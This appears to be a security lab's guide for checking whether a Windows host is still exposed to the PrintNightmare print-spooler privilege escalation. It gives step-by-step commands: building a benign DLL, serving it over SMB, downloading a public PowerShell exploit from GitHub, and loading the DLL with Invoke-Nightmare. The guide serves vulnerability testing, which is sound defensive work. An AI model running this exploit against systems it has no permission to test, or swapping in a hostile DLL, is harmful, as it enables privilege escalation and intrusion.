# PrintNightmare: CVE-2021-1675 / CVE 2021 34527

## Test if you are still vulnerable to PrintNightmare's privesc after patching

## Pre-check
```powershell
get-service spooler
```
![image](https://user-images.githubusercontent.com/49488209/124728554-9a371b80-df07-11eb-8e91-8d30eea92e73.png)

If spooler isn't running, won't be vulnerable, you can quit here and now.
Otherwise if running, begin exploitation.

## Prepare non-Malicious DLL
Run this on your attacker box

#### Install Dependencies
sudo apt apt install gcc-mingw-w64
sudo apt-get install g++-mingw-w64-x86-64

### Write the Dll
```bash
nano nightmare.cpp
```

This DLL will just print an innocent, non-malicious file called *Printnightmare* to *C:\*

```cpp
#include <windows.h>

int printy()
{
  WinExec("cmd.exe /c echo > C:\\printnightmare.txt",0);
   return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  printy();
  return 0;
}
```

#### Compile DLL
```bash
sudo x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL nightmare.cpp         
sudo x86_64-w64-mingw32-g++ -shared -o nightmare.dll nightmare.o -Wl,--out-implib,nightmare.a
```
![image](https://user-images.githubusercontent.com/49488209/124728640-a9b66480-df07-11eb-9c9d-42e2cea1b6c7.png)



## Transfer DLL however you like, impacket's smbserver.py works
### In Kali
```bash
sudo impacket-smbserver kali . -smb2support
```
![2021-07-07_09-43](https://user-images.githubusercontent.com/49488209/124728745-bdfa6180-df07-11eb-876b-1155026cb191.png)


### Copy from Kali to in Windows
```cmd
:: I copied mine into C:\
copy \\yourip\\kali\\nightmare.dll
```
![image](https://user-images.githubusercontent.com/49488209/124728825-cf436e00-df07-11eb-9ff5-d56bc338720a.png)


## Exploit
### Pull Powershell exploit, written by John Hammond and Caleb from Huntress

```powershell
invoke-webrequest -uri "https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1" -UseBasicParsing -outfile CVE-2021-1675.ps1
```

#### Deploy exploit
```powershell
import-module .\CVE-2021-1675.ps1
Invoke-Nightmare -DLL "C:\nightmare.dll"
```
![image](https://user-images.githubusercontent.com/49488209/124728899-e2563e00-df07-11eb-9b30-96d8509caad8.png)


### check C:\ for PrintNightmare.txt
![image](https://user-images.githubusercontent.com/49488209/124728938-eb470f80-df07-11eb-9acb-03bfe59a14ec.png)

### It doesn't matter what it's contents is, it just maters that it exists. 

### For any questions, comments, and criticisms, please find us on [Twitter](https://twitter.com/jumpseclabs?lang=en)





Main Twitter [Twitter](https://twitter.com/jumpsec)